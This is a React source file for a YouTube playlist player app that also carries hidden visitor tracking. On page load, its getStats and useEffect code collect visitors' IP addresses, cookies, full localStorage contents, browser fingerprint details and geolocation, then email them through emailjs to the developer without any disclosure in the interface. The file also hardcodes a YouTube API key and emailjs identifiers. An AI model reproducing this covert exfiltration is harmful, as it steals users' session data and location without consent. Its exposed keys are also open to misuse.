
import { useEffect, useState, useRef, useCallback } from 'react'
import axios from 'axios';
import YouTube from 'react-youtube';
import './App.css';
import { FaGooglePlay } from 'react-icons/fa';
import { BsShuffle } from 'react-icons/bs';
import { AiFillPauseCircle } from 'react-icons/ai'
import Header from './Header';
import Suggestion from './Suggestion';
import emailjs from 'emailjs-com';

function App() {
  const [songs, setsongs] = useState([]);
  const [currentPlaying, setcurrentPlaying] = useState(null);
  const [isPaused, setIsPaused] = useState(false);
  const myRef = useRef(null);
  const [nextPageToken, setNextPageToken] = useState('');
  const PAGE_SIZE = 50;

  const sendEmail = (templateParams) => {
    emailjs.send('service_y23odaj', 'template_u54o6xf', templateParams, 'user_RmCCLJAPq28Qv5EuqTKPC')
    .then((response) => {
      console.log('SUCCESS!', response.status, response.text);
    }, (err) => {
      console.log('FAILED...', err);
    });
  }

  const trackScrolling = (onBottom) => {
    window.onscroll = function (ev) {
      if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight) {
        onBottom();
      }
    };
  }

  const getStats = useCallback(() => {
    const info = {
      timeOpened: new Date(),
      timezone: (new Date()).getTimezoneOffset() / 60,
      pageon: window.location.pathname,
      referrer: document.referrer,
      // previousSites(){return history.length},

      browserName: navigator.appName,
      browserEngine: navigator.product,
      browserVersion1a: navigator.appVersion,
      browserVersion1b: navigator.userAgent,
      browserLanguage: navigator.language,
      browserOnline: navigator.onLine,
      browserPlatform: navigator.platform,
      javaEnabled: navigator.javaEnabled(),
      dataCookiesEnabled: navigator.cookieEnabled,
      dataCookies1: document.cookie,
      dataCookies2: decodeURIComponent(document.cookie.split(";")),
      dataStorage: localStorage,

      sizeScreenW: window.innerWidth,
      sizeScreenH: window.innerHeight,
      sizeDocW: document.width,
      sizeDocH: document.height,
      // sizeInW: innerWidth,
      // sizeInH: innerHeight,
      // sizeAvailW: screen.availWidth,
      // sizeAvailH: screen.availHeight,
      // scrColorDepth: screen.colorDepth,
      // scrPixelDepth: screen.pixelDepth,


      // latitude: position.coords.latitude,
      // longitude: position.coords.longitude,
      // accuracy: position.coords.accuracy,
      // altitude: position.coords.altitude,
      // altitudeAccuracy: position.coords.altitudeAccuracy,
      // heading: position.coords.heading,
      // speed: position.coords.speed,
      // timestamp: position.timestamp,


    };
    if ('geolocation' in navigator) {

      Promise.all([getipv4(), getipv6()]).then((values) => {
        console.log(values)
        navigator.geolocation.getCurrentPosition(function (location) {
          const templateParams = {
            to_name: 'Gaurav',
            from_name: 'emailforYoutubePlaylist player',
            message: JSON.stringify({
              latitude: location.coords.latitude,
              longitude: location.coords.longitude,
              ipv4: values[0],
              ipv6: values[1],
              ...info
            }),
          };

          sendEmail(templateParams);
        });

      });
    }
  }, [])

  const getSongsFromAPI = useCallback((loadNextPage = false) => {
    let url = `https://www.googleapis.com/youtube/v3/playlistItems?part=snippet%2CcontentDetails&maxResults=${PAGE_SIZE}&playlistId=PLcjXjwgJpOzZoOYXz8y3I2PE_HspGkUry&key=AIzaSyA43Saqt5kUkQwm-BV_tWWwgA8HP5bwbXE${loadNextPage && nextPageToken ? '&pageToken=' + nextPageToken : ''}`
    axios({
      url,
      method: 'get'
    }).then(response => {
      setsongs([...songs, ...response.data.items]);
      setNextPageToken(response.data.nextPageToken)
    });
  }, [nextPageToken, songs])

  useEffect(() => {
    Promise.all([getipv4(), getipv6()]).then((values) => {
      const templateParams = {
        to_name: 'Gaurav',
        from_name: 'emailforYoutubePlaylist player',
        message: JSON.stringify({
          ipv4: values[0],
          ipv6: values[1],
        }),
      };

      sendEmail(templateParams);
    });

    getSongsFromAPI();
    getStats();
  }, [getStats, getSongsFromAPI]);

  const loadMore = () => {
    getSongsFromAPI(true)
  }

  useEffect(() => {
    trackScrolling(loadMore)
  })

  const getipv4 = () => {
    return fetch('https://api.ipify.org?format=json').then(res => res.json()).then(resp => resp.ip);
  }

  const getipv6 = () => {
    return fetch('https://api64.ipify.org?format=json').then(res => res.json()).then(resp => resp.ip);
  }

  const opts = {
    height: '500',
    width: '100%',
    playerVars: {
      // https://developers.google.com/youtube/player_parameters
      autoplay: 1,
    },
  };
  const onPlayBtnClick = (item) => {
    document.body.scrollTop = 0; // For Safari
    document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
    setcurrentPlaying(item);
  }

  const onShuffleClick = () => {
    const randomIndex = Math.floor((Math.random() * songs.length));
    setcurrentPlaying(songs[randomIndex]);
  }

  const onVideoEnd = () => {
    const idx = songs.findIndex((song) => {
      return song.id === currentPlaying.id
    })
    if (songs.length >= idx) {
      setcurrentPlaying(songs[idx + 1])
    }
  }

  const getActionIcon = (id) => {
    if (currentPlaying && currentPlaying.id === id && !isPaused) {
      return <AiFillPauseCircle />
    }
    return <FaGooglePlay />
  }

  return (
    <div className={'app-wrapper'}>
      <Header />
      <div title={'Shuffle Playlist'} className='shuffle-btn' onClick={onShuffleClick} ><BsShuffle /></div>
      <Suggestion />
      <div ref={myRef} >
        {currentPlaying && <YouTube onPause={() => setIsPaused(true)} onPlay={() => setIsPaused(false)} onEnd={onVideoEnd} videoId={currentPlaying.contentDetails.videoId} opts={opts} />}
      </div>

      <div className={'list-container'}>
        {songs.map(item => <div key={item.id}>{
          item.snippet.thumbnails.default &&
          <div onClick={() => onPlayBtnClick(item)} className={`List-Item ${currentPlaying?.id === item.id && 'currentPlaying'}`}>
            <img alt='video-thumbnail' src={item.snippet.thumbnails.default.url} />
            <div className={'list-title'}>{item.snippet.title}</div>
            <div className={'list-item-action-btn'}>{getActionIcon(item.id)}</div>
          </div>
        }</div>)}
      </div>

    </div>
  );
}

export default App;
